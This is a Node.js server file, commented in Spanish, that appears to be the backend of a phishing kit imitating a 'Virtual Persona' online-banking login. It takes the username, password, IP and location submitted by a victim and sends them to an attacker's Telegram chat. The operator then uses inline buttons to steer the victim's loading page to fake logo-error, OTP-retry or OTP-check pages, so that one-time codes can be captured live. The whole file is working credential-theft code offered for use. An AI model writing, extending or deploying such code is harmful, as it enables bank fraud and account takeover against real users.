// ✅ server.js para Virtual-Persona + loading.html funcionando con flujo dinámico

const express = require("express");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");
const { v4: uuidv4 } = require("uuid");
const cors = require("cors");
require("dotenv").config();
const TelegramBot = require("node-telegram-bot-api");

const app = express();
const PORT = process.env.PORT || 3000;

// 🧠 Memoria temporal para instrucciones por sessionId
const instrucciones = new Map();

// ✅ Inicializar bot en modo polling
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
bot.deleteWebhook(); // importante para que funcione en modo polling

// Middlewares
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// ✅ Ruta para recibir datos desde Virtual-Persona.html
app.post("/virtualpersona", async (req, res) => {
  try {
    const { user, pass, ip, location } = req.body;
    const sessionId = uuidv4();
    const [city, country] = location.split(",");

    const text = `🔒 NUEVO INGRESO VIRTUAL 🔒\n\n👤 Usuario: ${user}\n🔑 Clave: ${pass}\n🌎 IP: ${ip} (${city.trim()}, ${country.trim()})\n🧾 SessionID: ${sessionId}`;

    const buttons = {
      inline_keyboard: [
        [
          { text: "❌ Error Logo", callback_data: `error_logo|${sessionId}` },
          { text: "🔁 Intentar OTP", callback_data: `error_otp|${sessionId}` },
        ],
        [
          { text: "✅ Continuar", callback_data: `siguiente|${sessionId}` },
        ],
      ],
    };

    // Enviar mensaje a Telegram
    await bot.sendMessage(process.env.CHAT_ID, text, {
      reply_markup: buttons,
    });

    res.json({ success: true, sessionId });
  } catch (error) {
    console.error("❌ Error en /virtualpersona:", error);
    res.status(500).json({ error: "Error interno del servidor" });
  }
});

// ✅ Ruta para el polling de instrucciones desde loading.html
app.get("/instruction/:sessionId", (req, res) => {
  const sessionId = req.params.sessionId;
  const accion = instrucciones.get(sessionId);

  if (accion) {
    instrucciones.delete(sessionId);
    res.json({ redirect_to: obtenerRuta(accion) });
  } else {
    res.json({ redirect_to: null });
  }
});

// ✅ Recibir la acción desde botones de Telegram
bot.on("callback_query", async (query) => {
  const [accion, sessionId] = query.data.split("|");

  if (!sessionId) return;

  instrucciones.set(sessionId, accion);

  await bot.answerCallbackQuery({
    callback_query_id: query.id,
    text: `✔ Acción recibida: ${accion}`,
    show_alert: true,
  });
});

// ✅ Ruta principal de prueba
app.get("/", (req, res) => {
  res.send("✅ Servidor activo");
});

// Función que define a qué redirigir según el botón presionado
function obtenerRuta(accion) {
  switch (accion) {
    case "error_logo":
      return "/virtualpersona.html";
    case "error_otp":
      return "/otp-error.html";
    case "siguiente":
      return "/otp-check.html";
    default:
      return "/"; // fallback
  }
}

// Inicializar servidor
app.listen(PORT, () => {
  console.log(`🚀 Servidor activo en puerto ${PORT}`);
});
